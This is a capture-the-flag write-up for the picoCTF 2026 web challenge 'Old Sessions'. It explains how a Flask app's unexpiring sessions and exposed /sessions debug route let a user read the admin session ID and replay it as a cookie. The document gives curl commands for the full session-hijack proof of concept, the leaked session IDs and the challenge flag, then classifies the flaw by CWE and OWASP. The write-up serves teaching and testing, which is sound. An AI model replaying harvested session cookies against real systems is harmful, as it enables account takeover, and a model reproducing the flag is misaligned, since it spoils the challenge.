# Old Sessions

**Platform:** CyLab Security Academy (picoCTF), picoCTF 2026
**Category:** Web Exploitation
**Difficulty:** Easy
**Flag:** `picoCTF{s3t_s3ss10n_3xp1rat10n5_77b6684a}`

## Summary

A social media style app ("The New Twitter") built with Flask never expires user sessions and
leaves a debug route, `/sessions`, exposed that dumps the entire server side session store in
plaintext. Any authenticated user can read every session ID on the platform from that route,
including the admin account's, and simply swap their own session cookie for it to take over the
admin session with no credentials needed.

## Discovery

After registering an account and logging in, the homepage shows a list of seeded comments from
other users. One comment reads:

```
mary_jones_8992: Hey I found a strange page at /sessions
```

Visiting that path while authenticated returns the raw contents of the server side session
store:

```
1) session:ZB3ratK3Oiz-MUUlVVn75AYEd7f0qDuEBctfIHnhT9A, {'_permanent': True, 'key': 'admin'}
2) session:wYt-9ufunu-8uTBax7BZLltL7UztI9p3OR1KscZbWZc, {'_permanent': True, '_flashes': [['error', None]]}
3) session:Wb2vT2zjNxqhMkDOMD05feTW4sCAJAjUySGcpjw9ipk, {'_permanent': True, 'key': 'attacker1'}
```

Every entry is marked `_permanent: True`, matching the app's own login `Set-Cookie` header, which
sets an expiry date decades in the future (`Expires=Mon, 22 Apr 2058`). Sessions are never
invalidated server side either, so an old admin session created long ago is still sitting in the
store, live and usable, exactly like the challenge prompt describes.

## Proof of Concept

Register and log in normally to get a valid session cookie and confirm the app works:

```
curl -s -c cj.txt -X POST http://TARGET/register \
  -d "username=attacker1&password=Passw0rd!&conf_password=Passw0rd!"

curl -s -c cj.txt -b cj.txt -X POST http://TARGET/login \
  -d "username=attacker1&password=Passw0rd!"
```

Read the leaked session table:

```
curl -s -b cj.txt http://TARGET/sessions
```

Replace the cookie with the admin's leaked session ID and load the homepage:

```
curl -s --cookie "session=ZB3ratK3Oiz-MUUlVVn75AYEd7f0qDuEBctfIHnhT9A" http://TARGET/
```

The response shows `Welcome admin` and the flag directly in the page body.

## Root Cause

Two compounding issues:

1. Sessions are created as permanent with no expiration and are never invalidated, so a
   privileged session created at any point in the app's history remains valid indefinitely.
2. A leftover debug endpoint, `/sessions`, exposes the raw session store to any authenticated
   user with no access control of its own, turning "sessions never expire" into a full account
   takeover primitive instead of just a lingering-login inconvenience.

## CWE / OWASP

- **CWE-613**: Insufficient Session Expiration
- **CWE-497**: Exposure of Sensitive System Information to an Unauthorized Control Sphere (the
  `/sessions` debug route)
- **OWASP A07:2021**: Identification and Authentication Failures
